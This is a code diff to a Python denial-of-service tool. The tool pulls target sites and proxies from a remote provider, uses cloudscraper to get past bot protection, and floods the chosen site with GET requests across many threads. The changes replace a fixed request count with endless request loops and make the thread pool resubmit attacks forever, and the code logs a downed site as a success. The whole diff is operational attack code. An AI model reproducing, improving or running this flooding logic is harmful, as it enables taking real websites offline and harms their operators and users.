@@ -9,6 +9,7 @@ from os import system
 from sys import stderr
 from threading import Thread
 from time import sleep
+from random import choice
 
 import cloudscraper
 from loguru import logger
@@ -58,6 +59,7 @@ def check_req():
     os.system("pip install -r requirements.txt")
     os.system("pip3 install -r requirements.txt")
 
+
 def mainth():
     result = 'processing'
     scraper = cloudscraper.create_scraper(
@@ -68,51 +70,50 @@ def mainth():
          'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
          'Accept-Encoding': 'gzip, deflate, br'})
 
-    while True:
-        logger.info("GET RESOURCES FOR ATTACK")
-        try:
-            site = remoteProvider.get_target_site()
-        except Exception as e:
-            logger.exception(e)
-            sleep(5)
-            continue
+    logger.info("GET RESOURCES FOR ATTACK")
+    try:
+        site = choice(remoteProvider.get_target_sites())
+    except Exception as e:
+        logger.exception(e)
+        sleep(5)
+        return
 
-        logger.info("STARTING ATTACK TO " + site)
+    logger.info("STARTING ATTACK TO " + site)
 
-        attacks_number = 0
+    attacks_number = 0
 
-        try:
-            attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
+    try:
+        attack = scraper.get(site, timeout=settings.READ_TIMEOUT)
 
-            if attack.status_code >= 302:
-                for proxy in remoteProvider.get_proxies():
-                    if proxy_view:
-                        logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
-                    scraper.proxies.update(
-                        {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-                    response = scraper.get(site)
-                    if 200 <= response.status_code <= 302:
-                        for i in range(settings.MAX_REQUESTS):
-                            response = scraper.get(site, timeout=10)
-                            attacks_number += 1
-                            logger.info("ATTACKED; RESPONSE CODE: " +
-                                        str(response.status_code))
-            else:
-                for i in range(settings.MAX_REQUESTS):
-                    response = scraper.get(site, timeout=10)
-                    attacks_number += 1
-                    logger.info("ATTACKED; RESPONSE CODE: " +
-                                str(response.status_code))
-            if attacks_number > 0:
-                logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        except ConnectionError as exc:
-            logger.success(f"{site} is down: {exc}")
-        except Exception as exc:
-            result = f"issue happened: {exc}"
-            logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-            continue
-        finally:
-            return result, site
+        if attack.status_code >= 302:
+            for proxy in remoteProvider.get_proxies():
+                if proxy_view:
+                    logger.info('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
+                scraper.proxies.update(
+                    {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+                response = scraper.get(site, timeout=10)
+                if 200 <= response.status_code <= 302:
+                    while True:
+                        response = scraper.get(site, timeout=10)
+                        if response.status_code >= 400:
+                            break
+                        attacks_number += 1
+                        logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
+        else:
+            while True:
+                response = scraper.get(site, timeout=10)
+                if response.status_code >= 400:
+                    break
+                attacks_number += 1
+                logger.info(f"ATTACKED {site}; RESPONSE CODE: {response.status_code}")
+        if attacks_number > 0:
+            logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
+    except ConnectionError as exc:
+        logger.success(f"{site} is down")
+        return result, site
+    except Exception as exc:
+        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
+        return result, site
 
 
 def clear():
@@ -138,7 +139,8 @@ if __name__ == '__main__':
     Thread(target=cleaner, daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        future_tasks = [executor.submit(mainth) for _ in range(threads)]
-        for task in as_completed(future_tasks):
-            status, site = task.result()
-            logger.info(f"{status.upper()}: {site}")
+        while True:
+            future_tasks = [executor.submit(mainth) for _ in range(threads)]
+            for task in as_completed(future_tasks):
+                status, site = task.result()
+                logger.info(f"{status.upper()}: {site}")
